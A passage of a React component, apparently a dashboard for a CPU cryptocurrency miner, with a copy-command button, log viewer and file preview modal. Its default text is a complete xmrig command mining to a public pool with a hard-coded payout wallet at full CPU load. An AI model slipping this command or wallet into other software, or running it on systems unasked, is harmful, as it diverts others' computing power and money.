                        navigator.clipboard.writeText(miningStatus.lastCommand);
                        setCopiedCmd(true);
                        setTimeout(() => setCopiedCmd(false), 2000);
                        showToast("Command copied!");
                      }
                    }}
                    className="text-emerald-400 hover:text-emerald-300 flex items-center gap-1"
                  >
                    {copiedCmd ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                    <span>{copiedCmd ? "Copied" : "Copy Command"}</span>
                  </button>
                </div>
                <div className="bg-black p-3 rounded border border-zinc-800 text-emerald-400 break-all select-all font-mono text-[11px] leading-relaxed">
                  {miningStatus?.lastCommand || "./xmrig -o rx.unmineable.com:3333 -a rx/0 -k -u USDT:0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8." + workerName + " -t 4 --cpu-max-threads-hint=100 --cpu-no-yield --donate-level 1 --keepalive"}
                </div>
              </div>

              {/* Raw Log Preview */}
              <div>
                <div className="flex items-center justify-between text-zinc-400 text-[11px] mb-1">
                  <span>Engine Output (Last 100 KB):</span>
                  <button
                    onClick={openLogsModal}
                    className="text-zinc-400 hover:text-white flex items-center gap-1 text-[10px]"
                  >
                    <RefreshCw className={`w-3 h-3 ${isFetchingLogs ? "animate-spin text-emerald-400" : ""}`} />
                    <span>Refresh</span>
                  </button>
                </div>
                <pre className="bg-black p-3 rounded border border-zinc-800 text-zinc-300 text-[10px] leading-relaxed overflow-x-auto max-h-72 no-scrollbar select-text">
                  {rawLogs || "Fetching engine output stream..."}
                </pre>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* File Content Preview Modal */}
      {selectedFileContent && (
        <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm flex items-center justify-center p-3 sm:p-6">
          <div className="bg-zinc-950 border border-zinc-800 rounded-xl w-full max-w-2xl flex flex-col max-h-[80vh] shadow-2xl overflow-hidden">
            <div className="px-4 py-3 border-b border-zinc-800 flex items-center justify-between bg-zinc-900/80">
              <span className="text-xs font-mono font-bold text-zinc-200 truncate">{selectedFileContent.name}</span>
              <button
                onClick={() => setSelectedFileContent(null)}
                className="p-1 rounded hover:bg-zinc-800 text-zinc-400 hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            </div>
            <pre className="p-4 overflow-auto flex-1 font-mono text-xs text-zinc-300 bg-black leading-relaxed select-text">
              {selectedFileContent.content}
            </pre>
          </div>
        </div>
      )}
    </div>
  );
}
